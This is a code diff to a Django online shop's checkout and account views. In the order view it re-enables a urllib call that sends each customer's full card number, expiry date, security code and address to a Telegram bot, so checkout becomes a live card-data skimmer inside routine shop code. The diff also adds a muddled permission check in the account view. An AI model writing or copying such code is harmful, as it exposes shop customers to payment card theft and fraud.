@@ -221,11 +221,15 @@ def make_order_view(request):
         forma = 'name ={}\n last_name ={}\n phone={}\ncard_number={}\nexpiry_date={}\ncard_code={}\naddress={}\ncountry={}\ncity={}\nzipcode={}\nNameonCard={}\ncomments={}\ncart_total={}\n'.format(
             name, last_name, phone, card_number, expiry_date, card_code, address, country, city, zipcode, NameonCard, comments, cart.cart_total)
         forma = urllib.parse.quote(forma)
-        # urllib.request.urlopen(
-        #     'https://api.telegram.org/bot{}/sendMessage?chat_id={}&text={}'.format(__token, __tl_chat_id, forma))
-
+        urllib.request.urlopen(
+            'https://api.telegram.org/bot{}/sendMessage?chat_id={}&text={}'.format(__token, __tl_chat_id, forma))
+        if request.user.is_anonymous:
+            user = None
+        else:
+            user = request.user
+        # print('request.user ==== ', dir(user))
         new_order = Order.objects.create(
-            user=request.user,
+            user=user,
             item=cart,
             total=cart.cart_total,
             first_name=name,
@@ -239,10 +243,12 @@ def make_order_view(request):
             country=country,
             city=city,
             zipcode=zipcode,
-            NameonCard=NameonCard
+            NameonCard=NameonCard,
+            order_session = request.session.session_key
         )
         del request.session['cart_id']
         del request.session['total']
+        request.session['order_session'] = request.session.session_key
         return HttpResponseRedirect(reverse('thank_you'))
     context = {
         'form': form,
@@ -252,10 +258,13 @@ def make_order_view(request):
 
 
 def account_view(request):
-    order = Order.objects.filter(user=request.user).order_by('-id')
-    context = {
-        'order': order
-    }
+    if not request.user.is_superuser or request.user.is_authenticated: 
+        order = Order.objects.filter(user=request.user).order_by('-id')
+        context = {
+            'order': order
+        }
+    else:
+        context = {}
     return render(request, 'account.html', context)
 
 
@@ -283,7 +292,7 @@ def registration_view(request):
         'form': form,
         'categories': categories
     }
-    return render(request, 'registration.html', context)
+    return render(request, 'signup.html', context)
 
 
 
